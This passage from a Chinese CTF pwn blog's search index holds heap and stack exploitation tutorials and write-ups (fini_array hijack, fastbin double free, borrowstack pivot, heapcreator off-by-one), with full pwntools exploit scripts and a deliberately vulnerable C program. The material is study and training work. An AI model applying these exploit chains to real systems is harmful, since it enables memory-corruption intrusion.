u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x168success(&quot;stack_addr :&quot;+hex(stack_addr))delete(9)delete(10)edit(10,8,p64(stack_addr^key))add()#16add()#17rdi_addr = libc_addr + libc.search(asm(&#x27;pop rdi;ret;&#x27;)).__next__()rsi_addr = libc_addr + libc.search(asm(&#x27;pop rsi;ret;&#x27;)).__next__()rdx_addr = libc_addr + 0x00000000000c7f32# rax_addr = libc_addr + 0x0000000000044c70# syscall = libc_addr + 0x0000000000026858open_addr = libc_addr + libc.sym[&#x27;open&#x27;]read_addr = libc_addr + libc.sym[&#x27;read&#x27;]write_addr = libc_addr + libc.sym[&#x27;write&#x27;]#open#flag_addr = stack_addr +0x10flag_addr = heap_addr + 0x2a0payload = p64(0)*1+p64(rdi_addr) + p64(flag_addr) + p64(rsi_addr) + p64(0) + p64(open_addr)payload += p64(rdi_addr) + p64(3) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(read_addr)payload += p64(rdi_addr) + p64(1) + p64(rsi_addr) + p64(flag_addr) + p64(rdx_addr) + p64(0x50) + p64(write_addr)# gdb.attach(io,&#x27;b *&#x27;+str(rdi_addr))# gdb.attach(io,&#x27;b *$rebase(0x1541)&#x27;)# pause(0)edit(17,len(payload),payload)io.recv()io.recv()\n\n","categories":["wp"]},{"title":"fini劫持","url":"/2022/10/12/fini%E5%8A%AB%E6%8C%81/","content":"基础概念\n一个程序在执行的时候 其并不是直接执行main函数\n先是执行入口函数\n入口函数对运行库和程序运行环境进行初始化，包括堆、I&#x2F;O、线程、全局变量的构造等等\n在完成初始化之后，调用main函数，正式开始执行函数主体部分\nmain函数执行完毕之后，返回到入口函数，入口函数进行清理工作，包括全局变量析构、堆销毁、关闭I&#x2F;O等，然后进行系统调用结束进程\n这里不具体到各个入口函数的区别 因为属于概念问题 理解起来不会有难度 可以自行查阅wiki\n总之 如果只是为了做题而记忆 可以按下面理解\n在静态编译下bss段中会存放一个fini数组\n在main函数结束后\n程序指向了fini函数\n其会先跳转到fini[1]存放的地址\n接着返回fini[0]存放的地址\n所以我们只需要将fini[1]修改为我们想要控制执行流的地方 再把fini[0]修改成fini函数\n程序就会陷入死循环 重复的执行fini[1]指向的地址\n动态编译下\nfini数组不会存储在bss段中 并且也只有一个字长\n(不知道是不是我遇到的这题的特殊情况)\n直接将这个地址的值覆盖成要重复执行的函数地址就行了\n不过在我遇到的这题中好像就只能跳转一次 不能理论无限执行\n","categories":["栈"]},{"title":"fastbinattack","url":"/2023/02/23/fastbinattack/","content":"前言很久没继续写堆部分的博客了  大部分的时间都花在重复性的刷题来掌握牢固低版本glibc的漏洞\n换句话说这段时间一点进步也没有233\n今天突然想起来许久没有更了 那就直接步入正题\n演示程序源码我自己写的 想复现的可以自行编译\n#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;Life is fucking movie&quot;);    puts(&quot;Life is always full of unhappiness, like this question&quot;);    puts(&quot;Anyway, what&#x27;s your answer&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    int index;    char size[20];    puts(&quot;What do you really want?&quot;);    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time);        puts(&quot;You can customize the size of chunk, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);        chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);        puts(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;error&quot;);            exit(0);        &#125;    &#125;else&#123;        exit(0);        puts(&quot;&quot;);    &#125;&#125;void delete()&#123;    char data[100];    int index;    puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;);    read(0,chunk_size[index],0x8);    puts(&quot;Come back!&quot;);    read(0,chunk_ptr[index],chunk_size[index]);&#125;void show()&#123;    puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to debug heap vulnerabilities&quot;);    puts(&quot;write by chen&quot;);    while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;);                puts(&quot;You will be stronger next time I see you&quot;);                exit(0);                break;        &#125;    &#125;&#125;\n\n顺便提供一下exp脚本 方便大家快速开始调试\nfrom pwn import*io = process(&quot;./testheap&quot;)elf = ELF(&quot;./testheap&quot;)libc = ELF(&quot;./locate_libc2.23&quot;)context.arch = &quot;amd64&quot;context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def debug():    gdb.attach(io)    pause()def add(size,payload):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;1&#x27;)    io.recvuntil(&quot;You can customize the size of chunk, but what about your life&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;)    io.send(payload)def delete(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;2&#x27;)    io.recvuntil(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;)    io.sendline(str(index))def edit(index,size,payload):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;3&#x27;)    io.recvuntil(&quot;It&#x27;s never too late to start again. What do you regret?&quot;)    io.sendline(str(index))    io.recvuntil(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;)    io.sendline(str(size))    io.recvuntil(&quot;Come back!&quot;)    io.send(payload)def show(index):    io.recvuntil(&quot;&gt;&quot;)    io.sendline(b&#x27;4&#x27;)    io.recvuntil(&quot;You can&#x27;t live a perfect life without making any effort&quot;)    io.sendline(str(index))\n\n\n\nubuntu16.04 libc2.23fastbin的范围是0x20 - 0x80 这里的大小不是用户申请的大小 而是系统实际分配的大小\nfastbin设计的初衷是为了方便小内存chunk的释放和重新分配 为了防止和相邻的chunk合并 所以位于fastbin中的free chunk的PREV_INUSE位不会被设置为0 始终为1\n存放fastbin链表的是malloc_state结构体\nstruct malloc_state&#123;  /* Serialize access.  */  __libc_lock_define (, mutex);  /* Flags (formerly in max_fast).  */  int flags;  /* Set if the fastbin chunks contain recently inserted free blocks.  */  /* Note this is a bool but not all targets support atomics on booleans.  */  int have_fastchunks;  /* Fastbins */  mfastbinptr fastbinsY[NFASTBINS];  /* Base of the topmost chunk -- not otherwise kept in a bin */  mchunkptr top;  /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;  /* Normal bins packed as described above */  mchunkptr bins[NBINS * 2 - 2];  /* Bitmap of bins */  unsigned int binmap[BINMAPSIZE];  /* Linked list */  struct malloc_state *next;  /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;  /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;  /* Memory allocated from the system in this arena.  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;\n\n在pwndbg中可以使用arena来查看其结构\n\n其中可以看到fastbin一共有十个链表 但是可用的只有7个\n其范围从0x20 - 0x80 并且是实际分配的chunk大小 而非用户申请的大小\n\nfastbin为单向链表 遵循着先进后出的原则 即先进来的chunk位于链表尾\n\n在2.23及以下的版本  glibc对于fastbin的检查是依靠于检测main_arena指向的chunk\n\n即位于链表头的chunk 如果要释放的chunk和位于链表头的chunk是同一个 那么就会触发double free终止进程\nif (SINGLE_THREAD_P)      &#123;\t/* Check that the top of the bin is not the record we are going to\t   add (i.e., double free).  */\tif (__builtin_expect (old == p, 0))\t  malloc_printerr (&quot;double free or corruption (fasttop)&quot;);\tp-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);\t*fb = p;      &#125;\n\n如果我们直接释放两次chunk1\n*** Error in &#96;.&#x2F;testheap’: double free or corruption (fasttop): 0x000055df88768010 ***\n程序就被终止了 但是如果我们利用chunk2来干扰一下链表结构\n如果此时我们释放chunk1后释放chunk2 此时再次释放chunk1\n在第二次释放chunk1之前的链表头为chunk2 系统此时误判没有double free 那么释放chunk1后的链表结构就如图所示\n\n在pwndbg中的表现如此\n\n可以看到此时chunk1即位于链表头又位于链表尾\n如果我们再次申请一个0x30大小的chunk 申请到的是位于链表头的chunk1 但是此时还有一个chunk1在链表中 \n我们此时获得了修改chunk1的fd域的能力 如果修改chunk1的fd域 此时的链表结构就会为\n\n此时我们再次申请三个chunk 申请的第三个chunk就会分配到’testtest’处的地址 chunk以该地址为chunk的prev_size首地址 而非用户区的首地址\nadd(0x20,b&#x27;aaaa&#x27;)#0add(0x20,b&#x27;aaaa&#x27;)#1add(0x10,b&#x27;aaaa&#x27;)#2delete(0)delete(1)delete(0)add(0x20,p64(0x666666))#3add(0x20,b&#x27;aaaa&#x27;)#4add(0x20,b&#x27;aaaa&#x27;)#5add(0x20,b&#x27;testtest&#x27;)debug()\n\n但是你很快就会发现 我们并不能如愿以偿申请到0x666666地址的chunk 这是因为fastbin在分配出chunk的时候对于chunk的size域还有一次检查\n检查你要申请的这个chunk的大小是否在该fastbin链的大小尺寸范围内\nif ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    &#123;      idx = fastbin_index (nb);      mfastbinptr *fb = &amp;fastbin (av, idx);      mchunkptr pp;      victim = *fb;      if (victim != NULL)\t&#123;\t  if (__glibc_unlikely (misaligned_chunk (victim)))\t    malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;);\t  if (SINGLE_THREAD_P)\t    *fb = REVEAL_PTR (victim-&gt;fd);\t  else\t    REMOVE_FB (fb, pp, victim);\t  if (__glibc_likely (victim != NULL))\t    &#123;\t      size_t victim_idx = fastbin_index (chunksize (victim));\t      if (__builtin_expect (victim_idx != idx, 0))\t\tmalloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);\t      check_remalloced_chunk (av, victim, nb);#if USE_TCACHE\t      /* While we&#x27;re here, if we see other chunks of the same size,\t\t stash them in the tcache.  */\t      size_t tc_idx = csize2tidx (nb);\t      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\t\t&#123;\t\t  mchunkptr tc_victim;\t\t  /* While bin not empty and tcache not full, copy chunks.  */\t\t  while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\t\t\t &amp;&amp; (tc_victim = *fb) != NULL)\t\t    &#123;\t\t      if (__glibc_unlikely (misaligned_chunk (tc_victim)))\t\t\tmalloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;);\t\t      if (SINGLE_THREAD_P)\t\t\t*fb = REVEAL_PTR (tc_victim-&gt;fd);\t\t      else\t\t\t&#123;\t\t\t  REMOVE_FB (fb, pp, tc_victim);\t\t\t  if (__glibc_unlikely (tc_victim == NULL))\t\t\t    break;\t\t\t&#125;\t\t      tcache_put (tc_victim, tc_idx);\t\t    &#125;\t\t&#125;#endif\t      void *p = chunk2mem (victim);\t      alloc_perturb (p, bytes);\t      return p;\t    &#125;\t&#125;    &#125;\n\n你可能也在其他教程或者wp中见到 我们在libc2.23的情况下 通常都是打malloc_hook 这是因为在malloc_hook-0x23处可以绕过fastbin的检测\n我们来看一下\nadd(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x80,b&#x27;aaaa&#x27;)#2add(0x10,b&#x27;aaaa&#x27;)#3delete(2)show(2)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fbf49537b78-0x7fbf49173000)success(&quot;libc_addr :&quot;+hex(libc_addr))malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]success(&quot;malloc_hook :&quot;+hex(malloc_hook))onegadget_addr = libc_addr + 0x4527adelete(0)delete(1)delete(0)add(0x68,p64(malloc_hook-0x23))add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;aaaa&#x27;)debug()\n\n\n此时malloc_hook-0x23正位于fastbin的链表上 我们跟进一下这个地址查看其内容\n\n可以看到此时这个地址的第二个字长处正好是0x7f 由于free chunk位于的是0x70的链表 所以可以通过检查将其取出 随后我们只需要覆盖0xb+0x8的垃圾数据就能篡改malloc_hook\n并且在ubuntu16中 这个地址处恒为0x7f\nubuntu18.04 libc2.27（old）版本来到ubuntu18 此时新设了一个bin 名为tcachebin  这里只需要知道0x20-0x408的chunk都会优先被释放到其单向链表上\n其他的我们在tcachebinattack中讲\n此时fastbin的漏洞依然存在 我们仍然可以通过穿插释放一个chunk来使glibc误判 但是由于fastbin的范围被tcache覆盖 我们需要将tcache的一个链表填满 才能释放到fastbin中 不过由于tcachebin的漏洞更好利用 实际上在ubuntu18中 大部分都是使用的tcachebinattack 这里做个了解就行了\nadd(0x68,b&#x27;aaaa&#x27;)#0add(0x68,b&#x27;aaaa&#x27;)#1add(0x68,b&#x27;aaaa&#x27;)#2for i in range(7):    add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)for i in range(7):    delete(i+3)delete(0)delete(1)delete(0)\n\n\n","categories":["堆"]},{"title":"gyctf_2020_borrowstack","url":"/2022/12/18/gyctf-2020-borrowstack/","content":"一题栈迁移 但是有涉及到内存越界的问题 记录一下 防止以后踩坑\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\nida打开看一下\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[96]; // [rsp+0h] [rbp-60h] BYREF  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  puts(aWelcomeToStack);  read(0, buf, 0x70uLL);  puts(&quot;Done!You can check and use your borrow stack now!&quot;);  read(0, &amp;bank, 0x100uLL);  return 0;&#125;\n\nbuf局部变量 bank位于bss段\n栈溢出的空间太少了 构造不了rop链 所以是想到把rop写到bank里面 然后栈迁移到对应位置\nps: 这里的逻辑关系得清楚一下 我们平时栈溢出覆盖返回地址 实际上利用main函数这个栈帧结束以后 会返回到父函数 覆盖了返回地址 所以哪怕我们先覆盖了返回地址 但是接下来程序并没有立刻结束 所以并不会影响我们修改bank的内容\n此时exp:\nfrom pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    print(hex(libc_addr))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=28099elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)main_addr = elf.sym[&#x27;main&#x27;]#io = remoteconnect(ip,port)io = process(&quot;./pwn&quot;)debug(1)io.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)bss_addr = 0x601080leave_addr = 0x400699puts_plt = 0x4004e0rdi_addr = 0x400703ret_addr = 0x4004c9puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]payload = cyclic(0x60)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.recvuntil(&quot;Done!You can check and use your borrow stack now!&quot;)payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)io.sendline(payload)\n\n但是发现行不通 gdb动调了一下发现 好像跳转到了奇怪的地方\n\n看了一下地址 好像是跑到了bss段上面的got表了 那有没有什么办法可以抬高栈(往低地址处抬高) 我们想到了ret指令 刚好可以读入0x100字节的数据在bank里面\npayload = p64(ret_addr)*20+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)\n\n接着就可以成功泄露puts的真实地址了\n接下来两个办法 既然只能刚好覆盖到ret addr 那就直接覆盖成onegadget 因为libc基址已经知道了\n或者重复上面的操作 按照常规的system进行系统调用  不过尝试了一下发现不行 也不清楚是什么原因\n完整exp:\nfrom pwn import*from struct import packfrom ctypes import *from LibcSearcher import*def libcmath(function_addr,function_name):    libc_addr = function_addr - libc.sym[function_name]    system_addr = libc_addr + libc.sym[&#x27;system&#x27;]    binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))    print(hex(libc_addr))    return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr):    payload = cyclic(offset)    payload += p64(gadget2_addr)    payload += cyclic(0x8)    payload += p64(0)    payload += p64(1)    payload += p64(call_addr)    payload += p64(rdx)    payload += p64(rsi)    payload += p64(rdi)    payload += p64(gadget1_addr)    payload += cyclic(56)    payload += p64(ret_addr)    return payloaddef localconnect(filename):    io = process(filename)    return iodef remoteconnect(ip,port):    io = remote(ip,port)    return iodef elf_libc(filename,libc_name):    elf = ELF(filename)    libc = ELF(libc_name)    return elf,libcdef debug(button):    if(button==1):        context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=28099elf,libc = elf_libc(filename,libc_name)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)main_addr = elf.sym[&#x27;main&#x27;]#io = remoteconnect(ip,port)io = process(&quot;./pwn&quot;)debug(1)io.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)bss_addr = 0x601080leave_addr = 0x400699puts_plt = 0x4004e0rdi_addr = 0x400703ret_addr = 0x4004c9puts_got = elf.got[&#x27;puts&#x27;]read_got = elf.got[&#x27;read&#x27;]payload = cyclic(0x60)+p64(bss_addr-0x8)+p64(leave_addr)io.send(payload)io.recvuntil(&quot;Done!You can check and use your borrow stack now!&quot;)payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)gdb.attach(io)io.sendline(payload)io.recv()puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr+0x4526aio.recvuntil(&quot;Ｗelcome to Stack bank,Tell me what you want&quot;)payload = cyclic(0x68)+p64(onegadget_addr)io.sendline(payload)io.interactive()\n\n","categories":["wp"]},{"title":"hitcontraining_heapcreator","url":"/2022/12/19/hitcontraining-heapcreator/","content":"做完这道题又学到一种合并堆的手法 感觉收获颇丰\nchecksec 看一下\n[!] Could not populate PLT: future feature annotations is not defined (unicorn.py, line 2)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n常规的64位堆菜单题\n  int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[8]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  setvbuf(_bss_start, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  while ( 1 )  &#123;    menu();    read(0, buf, 4uLL);    switch ( atoi(buf) )    &#123;      case 1:        create_heap();        break;      case 2:        edit_heap();        break;      case 3:        show_heap();        break;      case 4:        delete_heap();        break;      case 5:        exit(0);      default:        puts(&quot;Invalid Choice&quot;);        break;    &#125;  &#125;&#125;\n\nunsigned __int64 create_heap()&#123;  __int64 v0; // rbx  int i; // [rsp+4h] [rbp-2Ch]  size_t size; // [rsp+8h] [rbp-28h]  char buf[8]; // [rsp+10h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+18h] [rbp-18h]  v5 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 9; ++i )  &#123;    if ( !*(&amp;heaparray + i) )    &#123;      *(&amp;heaparray + i) = malloc(0x10uLL);      if ( !*(&amp;heaparray + i) )      &#123;        puts(&quot;Allocate Error&quot;);        exit(1);      &#125;      printf(&quot;Size of Heap : &quot;);      read(0, buf, 8uLL);      size = atoi(buf);      v0 = *(&amp;heaparray + i);      *(v0 + 8) = malloc(size);      if ( !*(*(&amp;heaparray + i) + 1) )      &#123;        puts(&quot;Allocate Error&quot;);        exit(2);      &#125;      **(&amp;heaparray + i) = size;      printf(&quot;Content of heap:&quot;);      read_input(*(*(&amp;heaparray + i) + 1), size);      puts(&quot;SuccessFul&quot;);      return __readfsqword(0x28u) ^ v5;    &#125;  &#125;  return __readfsqword(0x28u) ^ v5;&#125;\n\n先来分析一下create函数 首先创建了一个0x10大小的堆块 并将其地址存储在bss段上的一个全局数组里面 随后让我们输入要创建的堆块大小 这里我们先将这个0x10大小的堆块称为伴随堆块\n接着将创建的这个堆块的地址存储在伴随堆块的第二个字长处 并且将创建的大小存在第一个字长处\n基础的堆还是很常见这种创建两个chunk的 一般利用手法就是覆盖地址 来任意地址写 这里留意一下就可以了\n再来看一下edit函数\nunsigned __int64 edit_heap()&#123;  int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt; 9 )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;heaparray + v1) )  &#123;    printf(&quot;Content of heap : &quot;);    read_input(*(*(&amp;heaparray + v1) + 1), **(&amp;heaparray + v1) + 1LL);    puts(&quot;Done !&quot;);  &#125;  else  &#123;    puts(&quot;No such heap !&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n注意一下这个read_input函数就好了 跟进一下看是干什么的\nssize_t __fastcall read_input(void *a1, size_t a2)&#123;  ssize_t result; // rax  result = read(0, a1, a2);  if ( result &lt;= 0 )  &#123;    puts(&quot;Error&quot;);    _exit(-1);  &#125;  return result;&#125;\n\n理解起来没什么难度 * (*(&amp;heaparray + v1) + 1)) 是我们创建的堆块的地址  **(&amp;heaparray + v1) + 1LL是伴随堆块的第一个字长处的内容 也就是我们输入的size 二者结合起来 这个函数就是向我们创建的堆块中输入我们之前定义好的size大小 也就是不能进行堆溢出了(不破坏堆结构的情况下)\n接着再看一下show函数\nunsigned __int64 show_heap()&#123;  int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt; 9 )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;heaparray + v1) )  &#123;    printf(&quot;Size : %ld\\nContent : %s\\n&quot;, **(&amp;heaparray + v1), *(*(&amp;heaparray + v1) + 1));    puts(&quot;Done !&quot;);  &#125;  else  &#123;    puts(&quot;No such heap !&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n用的是printf函数 遇到\\x00截停 这个就不用说了 留意一下 反正泄露基址肯定是用到show函数的\n最后是比较关键的delete函数 看一下我们有什么漏洞可以利用吗\nunsigned __int64 delete_heap()&#123;  int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt; 9 )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;heaparray + v1) )  &#123;    free(*(*(&amp;heaparray + v1) + 1));    free(*(&amp;heaparray + v1));    *(&amp;heaparray + v1) = 0LL;    puts(&quot;Done !&quot;);  &#125;  else  &#123;    puts(&quot;No such heap !&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\n很遗憾的是把指针置零了 不能UAF 或者double free来任意写\n程序遍历到这里 就应该有个差不多的思路了 先泄露基址 然后再通过伴随堆块的地址索引来任意写\n那么具体怎么实现呢？\n我这里选择的是unsortedbin 泄露main_arena地址 没办法 太好用了\nadd(0x88,b&quot;aaaa&quot;) #0add(0x20,b&quot;bbbb&quot;) #1add(0x20,b&quot;cccc&quot;) #2delete(0)payload = b&#x27;a&#x27;*7+b&#x27;b&#x27;add(0x88,payload) #0show(0)io.recvuntil(&quot;b&quot;)main_arena = u64(io.recv(6).ljust(8,b&quot;\\x00&quot;))libc_addr = main_arena - (0x7fa0ee626b78-0x7fa0ee262000)\n\nchunk1和chunk2的作用我们这里可以先不用去纠结 先来解释一下payload为什么这样写 因为我们要通过show函数泄露基址的话\n刚才也说过了 printf函数遇到\\x00就会截停 所以fd域那边就会截停 但是我们创建堆块一定要输入数据 所以泄露fd的话最后得到的是不完整的地址 所以干脆覆盖满fd域 这样就会一直输出到fd域的地址 就泄露了基址 libc的计算办法我前面的博客有说到 这里不赘述\n接下来的难点还是在如何利用伴随堆块来任意写 我们没有办法进行堆溢出 不过我们还是有办法溢出一点点字节的\n如果我们申请一个0xn8的堆块 但是实际上系统分配给我们的是0xn0的堆块 但是存储起来的size是多出了16个字节的  因为64位情况下 堆块的最小单位是0x10字节 所以我们可以溢出覆盖到下一个chunk的size域 \npayload = cyclic(0x88)+b&quot;\\x71&quot;edit(0,payload)delete(1)\n\n这里溢出覆盖到的实际上是chunk1的伴随堆块 这也导致其往后0x70的空间都被划为这个堆块的区域 因为glibc识别到了size 被我们所欺骗了 这时候释放chunk1 bin中就会存储一个0x70大小的free chunk\n\n我们重新申请一个chunk的话 就拥有了0x60大小的空间\n\n同时 你还要注意 chunk2的指针是仍然存在的 而我们获得的空间是包含chunk2的伴随堆块\n这时候你回忆一下 edit函数是根据伴随堆块的第二个字长处的地址来写入第一个字长处大小的数据 所以我们通过覆盖这两个字长 就可以做到任意地址任意长度写\npayload = cyclic(0x8*10)+p64(0x8)+p64(elf.got[&#x27;free&#x27;])add(0x60,payload) #1#0x45216 0x4526a 0xf02a4 0xf1147onegadget_addr = libc_addr + 0xf02a4edit(2,p64(onegadget_addr))\n\n随后还有最后一个你可能会犯错的地方 你之前def的函数 如果有包括delete函数执行完以后 程序给你输出的done 那么是接收不到的 因为如果pwn成功了 直接就进行了系统调用 没有机会输出done的 手动再写一下就可以了\n完整exp:\nfrom pwn import*from LibcSearcher import *#io = remote(&quot;node4.buuoj.cn&quot;,29378)io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./buu16_64.so&quot;)context.log_level = &quot;debug&quot;def add(size,payload):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Size of Heap : &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content of heap:&quot;)    io.send(payload)    io.recvuntil(&quot;SuccessFul&quot;)def edit(index,payload):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Content of heap : &quot;)    io.send(payload)    io.recvuntil(&quot;Done !&quot;)def show(index):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))def delete(index):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Done !&quot;)add(0x88,b&quot;aaaa&quot;) #0 add(0x20,b&quot;bbbb&quot;) #1add(0x20,b&quot;cccc&quot;) #2delete(0)payload = b&#x27;a&#x27;*7+b&#x27;b&#x27;add(0x88,payload) #0show(0)io.recvuntil(&quot;b&quot;)main_arena = 